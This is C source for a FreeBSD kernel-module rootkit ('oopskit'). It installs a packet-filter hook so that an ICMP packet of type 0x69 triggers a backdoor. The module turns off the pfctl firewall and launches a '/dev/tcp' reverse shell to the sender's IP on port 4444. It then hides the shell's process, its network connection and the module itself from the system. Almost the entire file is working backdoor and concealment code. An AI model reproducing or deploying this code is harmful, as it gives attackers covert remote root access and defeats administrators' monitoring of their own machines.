#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/mbuf.h>
#include <sys/protosw.h>
#include <sys/sysproto.h>
#include <sys/kthread.h>
#include <sys/unistd.h>
#include <sys/sysent.h>
#include <sys/sched.h>
#include <sys/types.h>
#include <sys/malloc.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_var.h>
#include <sys/syscallsubr.h>
#include <sys/imgact.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>
#include <vm/vm.h>
#include <vm/pmap.h>
#include <vm/vm_map.h>
#include "magick.h"
#include "shadow_sysent.h"
#include "deepbg.h"
#include "whisper.h"
#include "kld_hiding.h"

#include <net/pfil.h>
#include <net/if.h>
/*
 * A backdoor pfil hook that is triggered whenever an ICMP packet is
 * received that:
 *
 *    1) Is of type 0x69
 *
 * pfctl is disabled and a reverse shell connection using bash is then attempted to the given address
 * and port number.
 *
 * netcat (nc) can be used to listen for the inbound connection.
 *
 */

#define KLD_NAME T_NAME"_oopskit"
#define KLD_FILE_NAME T_NAME"_oopskit.ko"
#define BASH "/usr/local/bin/bash"
#define BASH_OPT "-c"
#define BASH_COMMAND_STR "/sbin/pfctl -d; /bin/sh -i>& /dev/tcp/"
#define FULL_BASH_COMMAND_STR BASH_COMMAND_STR"255.255.255.255/65535 0>&1"
#define ARG2LEN 58
extern struct protosw inetsw[];

char ** oopskit_args = NULL;

unsigned int w_fport;

struct sx stk_xfer_lock;

struct oopskit_params {
   struct proc * stk_oopskit_proc;
   char * stk_oopskit_args[3][ARG2LEN];
   unsigned int fport;
};

static void start_oopskit(void *data) {
#ifdef DEBUG
   printf("[-] start_oopskit process started\n");
#endif
   struct oopskit_params * params = (struct oopskit_params *)data;
   vm_offset_t addr;
   struct execve_args args;
   int error;
   size_t length;
   char *ucp, **uap, *arg0, *arg1, *arg2;
   struct thread *td;
   struct proc *p;

   td = curthread;
   p = td->td_proc;

   /*
    * Need just enough stack to hold the faked-up "execve()" arguments.
    */
   addr = p->p_sysent->sv_usrstack - PAGE_SIZE;
   if (vm_map_find(&p->p_vmspace->vm_map, NULL, 0, &addr, PAGE_SIZE, 0,
      VMFS_NO_SPACE, VM_PROT_ALL, VM_PROT_ALL, 0) != 0) {
#ifdef DEBUG
      printf("[x] init: couldn't allocate argument space");
#endif
      return;
   }

   p->p_vmspace->vm_maxsaddr = (caddr_t)addr;
   p->p_vmspace->vm_ssize = 1;

   ucp = (char *)p->p_sysent->sv_usrstack;

   length = strlen((char *)params->stk_oopskit_args[2]) + 1;
   ucp -= length;
   copyout((char *)params->stk_oopskit_args[2], ucp, length);
   arg2 = ucp;

   length = strlen((char *)params->stk_oopskit_args[1]) + 1;
   ucp -= length;
   copyout((char *)params->stk_oopskit_args[1], ucp, length);
   arg1 = ucp;

   length = strlen((char *)params->stk_oopskit_args[0]) + 1;
   ucp -= length;
   copyout((char *)params->stk_oopskit_args[0], ucp, length);
   arg0 = ucp;

   /*
    * Move out the arg pointers.
    */

   uap = (char **)rounddown2((intptr_t)ucp, sizeof(intptr_t));
   (void)suword((caddr_t)--uap, (long)0);   /* terminator */
   (void)suword((caddr_t)--uap, (long)(intptr_t)arg2);
   (void)suword((caddr_t)--uap, (long)(intptr_t)arg1);
   (void)suword((caddr_t)--uap, (long)(intptr_t)arg0);

   /*
    * Point at the arguments.
    */
   args.fname = arg0;
   args.argv = uap;
   args.envv = NULL;

   /*
    * Now try to exec the program.  If can't for any reason
    * other than it doesn't exist, complain.
    *
    * Otherwise, return via fork_trampoline() all the way
    * to user mode as init!
    */
#ifdef DEBUG
   printf("[-] calling sys_execve\n");
#endif
   if ((error = sys_execve(td, &args)) == EJUSTRETURN) {
#ifdef DEBUG
      printf("[-] EJUSTRETURN returned from sys_execve\n");
#endif
      return;
   }

   if (error != ENOENT) {
#ifdef DEBUG
      printf("[x] exec %s: error %d\n", (char *)params->stk_oopskit_args[0],
         error);
#endif
   }

#ifdef DEBUG
   printf("[x] oopskit failed\n");
#endif
}

static void create_oopskit(void *data) {
#ifdef DEBUG
   printf("[-] create_oopskit called\n");
#endif
   struct oopskit_params * params = (struct oopskit_params *)data;
   struct fork_req fr;
   struct ucred *newcred, *oldcred;
   struct thread *td;
   int error;

   bzero(&fr, sizeof(fr));
   fr.fr_flags = RFFDG | RFPROC | RFSTOPPED;
   fr.fr_procp = &params->stk_oopskit_proc;
   error = fork1(curthread, &fr);
   if (error) {
#ifdef DEBUG
      printf("[x] cannot fork oopskit: %d\n", error);
#endif
      return;
   }

   /* divorce oopskit's credentials from the kernel's */
   newcred = crget();
   sx_xlock(&proctree_lock);
   PROC_LOCK(params->stk_oopskit_proc);
   oldcred = params->stk_oopskit_proc->p_ucred;
   crcopy(newcred, oldcred);
   proc_set_cred(params->stk_oopskit_proc, newcred);
   td = FIRST_THREAD_IN_PROC(params->stk_oopskit_proc);
   crfree(td->td_ucred);
   td->td_ucred = crhold(params->stk_oopskit_proc->p_ucred);
   PROC_UNLOCK(params->stk_oopskit_proc);
   sx_xunlock(&proctree_lock);
   crfree(oldcred);

   cpu_fork_kthread_handler(FIRST_THREAD_IN_PROC(params->stk_oopskit_proc),
      start_oopskit, params);
}

static void kick_oopskit(void *data) {
   struct oopskit_params * params = (struct oopskit_params *)data;
   struct thread *td;

   td = FIRST_THREAD_IN_PROC(params->stk_oopskit_proc);
   thread_lock(td);
   TD_SET_CAN_RUN(td);
   sched_add(td, SRQ_BORING);
   thread_unlock(td);
}

static void oopskit() {
#ifdef DEBUG
   printf("[-] oopskit thread created\n");
#endif
   // Structure for holding parameters on the stack
   struct oopskit_params params;

   sx_xlock(&stk_xfer_lock);
   // Copy oopskit_args to stack
   bzero(&params.stk_oopskit_args[0][0], ARG2LEN);
   strcpy((char *)params.stk_oopskit_args[0], (char *)oopskit_args[0]);
   bzero(&params.stk_oopskit_args[1][0], ARG2LEN);
   strcpy((char *)params.stk_oopskit_args[1], (char *)oopskit_args[1]);
   bzero(&params.stk_oopskit_args[2][0], ARG2LEN);
   strcpy((char *)params.stk_oopskit_args[2], (char *)oopskit_args[2]);

   // Copy port to stack
   params.fport = w_fport;

   // Free memory since args were copied to the stack
   free(oopskit_args[0], M_TEMP);
   free(oopskit_args[1], M_TEMP);
   free(oopskit_args[2], M_TEMP);
   free(oopskit_args, M_TEMP);
   oopskit_args = NULL;
   sx_xunlock(&stk_xfer_lock);

   create_oopskit(&params);
   kick_oopskit(&params);

   int status;
   int error;
   sy_call_t * deepbg = shadow_sysent[DEEPBG_INDEX].new_sy_call;
   sy_call_t * whisper = shadow_sysent[WHISPER_INDEX].new_sy_call;
   struct whisper_args wa;
   struct deepbg_args da;
   da.p_pid = params.stk_oopskit_proc->p_pid;
   pause("zzz", 100);

   if (deepbg != NULL) {
#ifdef DEBUG
      printf("[-] Hiding pid %u\n", da.p_pid);
#endif

      if ((error = deepbg(curthread, &da)) != 0) {
#ifdef DEBUG
         printf("[x] deepbg %u failed\n", da.p_pid);
#endif
      }
   }

   // Hide connection
   if (whisper != NULL) {
      wa.lport = 0;
      wa.fport = params.fport;
#ifdef DEBUG
      printf("[-] Hiding connection with foreign port %u\n", wa.fport);
#endif

      if ((error = whisper(curthread, &wa)) != 0) {
#ifdef DEBUG
         printf("[x] whisper %u failed\n", wa.fport);
#endif
      }
   }

   kern_wait(curthread, params.stk_oopskit_proc->p_pid, &status, 0, NULL);

#ifdef DEBUG
   printf("[-] oopskit thread exiting\n");
#endif
   kthread_exit();
}

static long get_source_ip(unsigned char *data) {
    int etherType = ((data[12] << 8) + data[13]);
    int ethLen = 13;
    if (etherType == 0x8100) {
	    ethLen = 15;
    }
    return (data[ethLen+13]) + (data[ethLen+14] << 8) + (data[ethLen+15] << 16) + (data[ethLen+16] << 24);
}


static void reverse_shell(long ip) {
    char* ptr;
    struct in_addr in = {ip};
    uint16_t fport = 4444;

    sx_xlock(&stk_xfer_lock);
    w_fport = fport;

    oopskit_args = malloc(3*sizeof(char *), M_TEMP, M_NOWAIT);
    oopskit_args[0] = malloc(strlen(BASH)+1, M_TEMP, M_NOWAIT);
    oopskit_args[1] = malloc(strlen(BASH_OPT)+1, M_TEMP, M_NOWAIT);
    oopskit_args[2] = malloc(strlen(FULL_BASH_COMMAND_STR)+1, M_TEMP, M_NOWAIT);

    strcpy(oopskit_args[0], BASH);
    strcpy(oopskit_args[1], BASH_OPT);
    strcpy(oopskit_args[2], FULL_BASH_COMMAND_STR);
    ptr = oopskit_args[2];
    bzero(ptr, ARG2LEN);

    strcpy(ptr, BASH_COMMAND_STR);

    ptr+=strlen(ptr);
    char tmp[16];
    bzero(tmp, 16);
    inet_ntoa_r(in, tmp);
    strcpy(ptr, tmp);
    ptr+=strlen(tmp);
    strcpy(ptr, "/");
    ptr++;
#ifdef DEBUG
    printf("[-] Let's be bad guys.\n");
    printf("[-] destination = %s\n", tmp);
#endif

    bzero(tmp, 16);
    sprintf(tmp, "%u", fport);
    strcpy(ptr, tmp);
    ptr+=strlen(tmp);
    strcpy(ptr, " 0>&1");
#ifdef DEBUG
    printf("[-] port = %u\n", fport);
    printf("[-] %s %s %s\n", oopskit_args[0], oopskit_args[1],
        oopskit_args[2]);
#endif
    sx_xunlock(&stk_xfer_lock);
    struct thread *oopskit_thread;

    struct kthread_desc kd = {
        "oopskit",
        oopskit,
        &oopskit_thread
    };

    bool disable_sleeping = false;

    // If the current thread isn't allowed to sleep, enable sleeping and set a
    // flag to undo after starting a new thread.
    if (!THREAD_CAN_SLEEP()) {
        THREAD_SLEEPING_OK();
        disable_sleeping = true;
    }

    kthread_start(&kd);

    // Disable sleeping if the current thread was not allowed to sleep
    if (disable_sleeping) {
        THREAD_NO_SLEEPING();
    }

#ifdef DEBUG
    printf("[-] kthread_start called\n");
#endif
}

static int is_target(unsigned char *data) {
    int etherType = ((data[12] << 8) + data[13]);
    int ipHeaderLength = (data[14] & 0x0F) * 4;
    int ethLen = 13;
    if (etherType == 0x8100) {
        etherType = ((data[14] << 8) + data[15]);
	    ipHeaderLength = (data[16] & 0x0F) * 4;
	    ethLen = 15;
    }
    if (etherType != 0x0800) {
        return 0;
    }
    int protocol = data[ethLen + 10];
    if (protocol != 1) {
        return 0;
    }
    int icmp_type = data[ethLen + ipHeaderLength + 1];
    if (icmp_type == 0x69) {
        return data[ethLen + ipHeaderLength + 2];
    }
    return 0;
}

static int hook(void *arg, struct mbuf **mp, struct ifnet *ifp, int dir, int flags, struct inpcb *inp) {
    char *databuf = (*mp)->m_data;
    int len = (*mp)->m_len;
    unsigned char fixed_data[len];
    for (int i = 0; i < len; i++) {
	   fixed_data[i] = databuf[i] & 0x000000FF;
    }
    int targetFlag = is_target(fixed_data);
#ifdef DEBUG
    if (targetFlag) {
        printf("Oops: %d\n", targetFlag);
    }
#endif
    if (targetFlag == 1) {
        reverse_shell(get_source_ip(fixed_data));
    }
    return 0;
}

/* The function called at load/unload. */
static int load(struct module *module, int cmd, void *arg) {
#ifndef DEBUG
   kld_hiding(module, KLD_FILE_NAME, KLD_NAME);
#endif

   int error = 0;
   switch (cmd) {
      case MOD_LOAD:
#ifdef DEBUG
         uprintf("[-] Loading oopskit module\n");
#endif
         void *head = pfil_head_get(PFIL_TYPE_AF, AF_LINK);
	 int res = pfil_add_hook_flags(hook, NULL, PFIL_ALL | PFIL_WAITOK | 17, head);
	 printf("[-] Res: %d\n", res);
	 sx_init(&stk_xfer_lock, "stk_xfer_lock");
         break;
      case MOD_UNLOAD:
#ifdef DEBUG
         uprintf("[-] Unloading oopskit module\n");
#endif
         head = pfil_head_get(PFIL_TYPE_AF, AF_LINK);
	 res = pfil_remove_hook_flags(hook, NULL, PFIL_ALL | PFIL_WAITOK | 17, head);
	 printf("Res: %d\n", res);
	 sx_destroy(&stk_xfer_lock);
         break;
      default:
         error = EOPNOTSUPP;
         break;
   }
   return (error);
}

static moduledata_t icmp_input_oopskit_mod = {
   "icmp_input_oopskit",      /* module name */
   load,                       /* event handler */
   NULL                        /* extra data */
};

DECLARE_MODULE(icmp_input_oopskit, icmp_input_oopskit_mod, SI_SUB_DRIVERS,
   SI_ORDER_ANY);
MODULE_DEPEND(MODNAME, shdw_sysent_tbl, 1, 1, 1);
